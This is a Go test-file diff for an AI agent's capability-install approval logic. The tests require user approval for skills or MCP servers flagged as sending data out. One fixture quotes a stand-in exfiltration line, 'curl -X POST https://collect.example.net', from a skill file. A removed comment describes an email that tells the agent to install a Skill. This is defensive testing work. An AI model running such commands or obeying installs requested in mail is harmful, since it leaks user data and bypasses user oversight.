@@ -33,7 +33,9 @@ func (f fakeLibrary) ListSkills(context.Context) ([]*skill.Skill, error) { retur
 type fakeCapabilities struct {
 	skillErr, serverErr error
 	installErr          error
-	installed           []string
+	// risks 非空时安装被搁置，带 accept 才装上。
+	risks     []string
+	installed []string
 }
 
 func (f *fakeCapabilities) SearchSkills(context.Context, string, int) ([]market.SkillHit, error) {
@@ -44,22 +46,31 @@ func (f *fakeCapabilities) SearchServers(context.Context, string, int) ([]market
 	return []market.ServerHit{{Name: "app.example/weather", Installable: true}}, f.serverErr
 }
 
-func (f *fakeCapabilities) InstallSkill(_ context.Context, id string) (*skill.Skill, error) {
-	if f.installErr != nil {
-		return nil, f.installErr
-	}
-	f.installed = append(f.installed, id)
-	return &skill.Skill{ID: market.SkillID(id), Name: "meeting-notes"}, nil
-}
-
-func (f *fakeCapabilities) InstallServer(_ context.Context, name string) (*market.Server, []string, error) {
+func (f *fakeCapabilities) InstallSkill(_ context.Context, id string, accept bool) (*skill.Skill, *market.Pending, error) {
 	if f.installErr != nil {
 		return nil, nil, f.installErr
 	}
+	if len(f.risks) > 0 && !accept {
+		return nil, &market.Pending{Kind: "skill", ID: id, Risks: f.risks}, nil
+	}
+	f.installed = append(f.installed, id)
+	return &skill.Skill{ID: market.SkillID(id), Name: "meeting-notes"}, nil, nil
+}
+
+func (f *fakeCapabilities) InstallServer(_ context.Context, name string, accept bool) (*market.Server, []string, *market.Pending, error) {
+	if f.installErr != nil {
+		return nil, nil, nil, f.installErr
+	}
+	if len(f.risks) > 0 && !accept {
+		return nil, nil, &market.Pending{Kind: "mcp", ID: name, Risks: f.risks}, nil
+	}
 	f.installed = append(f.installed, name)
 	srv := market.ServerName(name)
-	return &market.Server{Name: srv}, []string{srv + ".forecast"}, nil
+	return &market.Server{Name: srv}, []string{srv + ".forecast"}, nil, nil
 }
+
+// PendingRisks 让它同时充当审批用的 InstallRisks。
+func (f *fakeCapabilities) PendingRisks(string, string) []string { return f.risks }
 
 func capStep(tool, params string) *core.Step {
 	s := core.NewStep("t", 1, core.StepTool, json.RawMessage(params))
@@ -125,37 +136,48 @@ func TestCapability_绑定了Skill的任务不能自己装东西(t *testing.T) {
 	}
 }
 
-func TestCapabilityDefaults_搜索后直接装读过别的外部内容要确认(t *testing.T) {
+func TestCapabilityDefaults_低风险的直接装有外传风险的一律要批准(t *testing.T) {
 	p := NewPlanner(&fakeModel{}, catalogWith(core.SideEffectReadOnly), PlannerOptions{}).
 		WithCapabilities(fakeLibrary{}).WithMail(true, true)
 	task := core.NewTask("t", "帮我整理会议纪要", core.TrustUser)
-	check := func(pol *policy.Policy, h *fakeHistory) kernel.ApprovalOutcome {
+	risks := &fakeCapabilities{risks: []string{"会把数据传到外部，SKILL.md 第 9 行：curl -X POST https://collect.example.net"}}
+	check := func(pol *policy.Policy, h *fakeHistory, params string) (kernel.ApprovalOutcome, string) {
 		t.Helper()
 		CapabilityDefaults(pol)
-		d, err := p.toolDecision(ToolCapabilityInstall, json.RawMessage(`{"kind":"skill","id":"a/b/c"}`), "")
+		d, err := p.toolDecision(ToolCapabilityInstall, json.RawMessage(params), "")
 		if err != nil {
 			t.Fatalf("决策失败: %v", err)
 		}
-		out, _, err := NewApprover(pol, policy.NewClassifier(), NewMemoryUsageTracker()).WithHistory(h).
-			CheckAction(context.Background(), task, d)
+		out, reason, err := NewApprover(pol, policy.NewClassifier(), NewMemoryUsageTracker()).
+			WithHistory(h).WithInstallRisks(risks).CheckAction(context.Background(), task, d)
 		if err != nil {
 			t.Fatalf("判定失败: %v", err)
 		}
-		return out
+		return out, reason
 	}
-
+	const plain = `{"kind":"skill","id":"a/b/c"}`
+	const accept = `{"kind":"skill","id":"a/b/c","accept_risk":true}`
 	searched := doneStep(ToolCapabilitySearch, core.TrustExternal)
-	if out := check(&policy.Policy{}, &fakeHistory{steps: []*core.Step{searched}}); out != kernel.ApprovalAuto {
-		t.Fatalf("搜索之后的安装应直接执行，实际 %s", out)
-	}
-	// 邮件里说"装一下这个 Skill"——那不是用户的意思。
 	mail := doneStep(ToolMailRead, core.TrustExternal)
-	if out := check(&policy.Policy{}, &fakeHistory{steps: []*core.Step{mail, searched}}); out != kernel.ApprovalManual {
-		t.Fatalf("读过邮件之后的安装应由用户确认，实际 %s", out)
+
+	// 低风险的安装直接执行。该不该问看的是装的东西有没有风险，任务读过别的外部内容不影响。
+	for _, h := range []*fakeHistory{{}, {steps: []*core.Step{searched}}, {steps: []*core.Step{mail, searched}}} {
+		if out, reason := check(&policy.Policy{}, h, plain); out != kernel.ApprovalAuto {
+			t.Fatalf("低风险的安装应直接执行，实际 %s（%s）", out, reason)
+		}
 	}
-	// 用户自己收紧了。
+	// 有外传风险的：一律要用户批准，理由里把风险点列出来。
+	out, reason := check(&policy.Policy{}, &fakeHistory{}, accept)
+	if out != kernel.ApprovalManual || !strings.Contains(reason, "collect.example.net") || !strings.Contains(reason, "Skill a/b/c") {
+		t.Fatalf("有外传风险的安装应由用户批准并列出风险点: %s（%s）", out, reason)
+	}
+	// 用户写了放行规则也放不过去。
+	if out, _ := check(&policy.Policy{Rules: []policy.Rule{{Tool: ToolCapabilityInstall}}}, &fakeHistory{}, accept); out != kernel.ApprovalManual {
+		t.Fatalf("任何规则都不该放行有风险的安装，实际 %s", out)
+	}
+	// 用户自己收紧了：低风险的也问。
 	never := &policy.Policy{Rules: []policy.Rule{{Tool: ToolCapabilityInstall, Never: true}}}
-	if out := check(never, &fakeHistory{}); out != kernel.ApprovalManual {
+	if out, _ := check(never, &fakeHistory{}, plain); out != kernel.ApprovalManual {
 		t.Fatalf("用户设了始终确认就该确认，实际 %s", out)
 	}
 	// 搜索不该让别的改动也跟着免确认。
@@ -164,10 +186,10 @@ func TestCapabilityDefaults_搜索后直接装读过别的外部内容要确认(
 		t.Fatalf("决策失败: %v", err)
 	}
 	pol := &policy.Policy{Rules: []policy.Rule{{Tool: ToolMailSend}}}
-	out, _, err := NewApprover(pol, policy.NewClassifier(), NewMemoryUsageTracker()).
+	got, _, err := NewApprover(pol, policy.NewClassifier(), NewMemoryUsageTracker()).
 		WithHistory(&fakeHistory{steps: []*core.Step{searched}}).CheckAction(context.Background(), task, send)
-	if err != nil || out != kernel.ApprovalManual {
-		t.Fatalf("搜索结果是外部内容，之后的发信应由用户确认: %s, %v", out, err)
+	if err != nil || got != kernel.ApprovalManual {
+		t.Fatalf("搜索结果是外部内容，之后的发信应由用户确认: %s, %v", got, err)
 	}
 }
 
@@ -210,6 +232,21 @@ func TestActuator_查找安装与读取(t *testing.T) {
 	if strings.Join(caps.installed, ",") != "app.example/weather,acme/skills/meeting-notes" {
 		t.Fatalf("安装的东西不对: %v", caps.installed)
 	}
+	// 有外传风险：不装，把风险点交回给模型；带 accept_risk 才装上。
+	caps.risks = []string{"工具 x.share 会把你交给它的内容提交到这个外部服务"}
+	res, err = a.Execute(ctx, task, capStep(ToolCapabilityInstall, `{"kind":"mcp","id":"app.example/risky"}`))
+	if err != nil || res.Trust != core.TrustExternal ||
+		!strings.Contains(string(res.Output), `"needs_approval":true`) || !strings.Contains(string(res.Output), "x.share") {
+		t.Fatalf("有风险的安装应被搁置并说明风险: %s %s, %v", res.Trust, res.Output, err)
+	}
+	if len(caps.installed) != 2 {
+		t.Fatalf("搁置的不该装上: %v", caps.installed)
+	}
+	res, err = a.Execute(ctx, task, capStep(ToolCapabilityInstall, `{"kind":"mcp","id":"app.example/risky","accept_risk":true}`))
+	if err != nil || len(caps.installed) != 3 || strings.Contains(string(res.Output), "needs_approval") {
+		t.Fatalf("批准后应装上: %s, %v", res.Output, err)
+	}
+	caps.risks = nil
 	// 扫描没过：这一步失败，原因带回给模型。
 	caps.installErr = skillscan.ErrUnsafe
 	if _, err := a.Execute(ctx, task, capStep(ToolCapabilityInstall, `{"kind":"skill","id":"a/b/c"}`)); !errors.Is(err, skillscan.ErrUnsafe) {
